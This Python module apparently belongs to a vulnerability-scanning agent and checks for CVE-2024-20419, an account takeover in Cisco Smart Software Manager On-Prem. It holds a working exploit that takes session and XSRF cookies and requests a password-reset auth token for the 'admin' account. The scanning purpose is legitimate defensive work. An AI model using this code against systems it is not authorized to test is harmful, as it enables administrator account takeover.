"""Agent Asteroid implementation for CVE-2024-20419"""

import logging
from typing import Any

import requests
from ostorlab.agent.kb import kb
from ostorlab.agent.mixins import agent_report_vulnerability_mixin

from agent import definitions
from agent import exploits_registry

VULNERABILITY_TITLE = "Account Takeover in Cisco Smart Software Manager On-Prem"
VULNERABILITY_REFERENCE = "CVE-2024-20419"
VULNERABILITY_DESCRIPTION = (
    "Cisco Smart Software Manager On-Prem is vulnerable to an account takeover attack. "
    "Attackers can exploit this vulnerability to retrieve an authentication token "
    "and potentially reset the account password."
)
DEFAULT_PORT = 443
REACHABLE_CHECK_TITLE = "On-Prem License Workspace"

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)


def _create_vulnerability(target: definitions.Target) -> definitions.Vulnerability:
    """Creates a vulnerability report based on the detection."""
    entry = kb.Entry(
        title=VULNERABILITY_TITLE,
        risk_rating="CRITICAL",
        short_description=VULNERABILITY_DESCRIPTION,
        description=VULNERABILITY_DESCRIPTION,
        references={
            "nvd.nist.gov": f"https://nvd.nist.gov/vuln/detail/{VULNERABILITY_REFERENCE}",
        },
        recommendation=(
            "- Apply security patches from Cisco if available.\n"
            "- Monitor and validate authentication processes.\n"
            "- Restrict access to the vulnerable endpoint."
        ),
        security_issue=True,
        privacy_issue=False,
        has_public_exploit=True,
        targeted_by_malware=False,
        targeted_by_ransomware=False,
        targeted_by_nation_state=False,
    )
    technical_detail = (
        f"{target.origin} is vulnerable to {VULNERABILITY_REFERENCE}: "
        f"{VULNERABILITY_TITLE}"
    )
    return definitions.Vulnerability(
        entry=entry,
        technical_detail=technical_detail,
        risk_rating=agent_report_vulnerability_mixin.RiskRating.CRITICAL,
    )


def _is_endpoint_reachable(url: str) -> bool:
    """Checks if the endpoint is reachable and contains specific content."""
    try:
        response = requests.get(url, timeout=10)
        response.raise_for_status()
        if REACHABLE_CHECK_TITLE in response.text:
            return True
    except requests.RequestException as error:
        logger.error("Request failed: %s", error)
    return False


def _get_auth_token(url: str, username: str) -> Any | None:
    """Attempts to retrieve the auth token using the exploit."""
    try:
        # Step 1: Get necessary tokens
        get_url = f"{url}/backend/settings/oauth_adfs?hostname=polar"
        response = requests.get(get_url, verify=False, timeout=10)
        xsrf_token = _get_cookie_value(dict(response.headers), "XSRF-TOKEN")
        lic_engine_session = _get_cookie_value(
            dict(response.headers), "_lic_engine_session"
        )

        if not lic_engine_session or not xsrf_token:
            logger.error("Required cookies not found in the response.")
            return None

        # Step 2: Generate auth token
        post_url = f"{url}/backend/reset_password/generate_code"
        headers = {
            "Accept": "application/json",
            "Content-Type": "application/json",
            "X-Xsrf-Token": xsrf_token,
        }
        cookies = {
            "_lic_engine_session": lic_engine_session,
            "XSRF-TOKEN": xsrf_token,
        }
        payload = {"uid": username}
        post_response = requests.post(
            post_url,
            headers=headers,
            cookies=cookies,
            json=payload,
            verify=False,
            timeout=10,
        )

        if post_response.status_code == 200:
            post_response_json = post_response.json()
            return post_response_json.get("auth_token")
        else:
            logger.error(
                "Failed to retrieve auth token, status code: %s",
                post_response.status_code,
            )
            return None

    except requests.RequestException as error:
        logger.error("Request failed: %s", error)
        return None


def _get_cookie_value(headers: dict[str, str], cookie_name: str) -> Any | None:
    """Extracts the cookie value from the headers."""
    cookies = headers.get("Set-Cookie", "").split(",")
    for cookie in cookies:
        if cookie_name in cookie:
            parts = cookie.split(";")
            for part in parts:
                if cookie_name in part:
                    return part.split("=")[1].strip()
    return None


@exploits_registry.register
class CVE202420419Exploit(definitions.Exploit):
    """Exploit for CVE-2024-20419: Account Takeover in Cisco Smart Software Manager On-Prem"""

    def accept(self, target: definitions.Target) -> bool:
        """Check if the target is valid for this exploit."""
        url = target.origin
        return _is_endpoint_reachable(url)

    def check(self, target: definitions.Target) -> list[definitions.Vulnerability]:
        """Checks for vulnerabilities in the target."""
        vulnerabilities = []
        auth_token = _get_auth_token(target.origin, "admin")

        if auth_token is not None:
            vulnerabilities.append(_create_vulnerability(target))

        return vulnerabilities
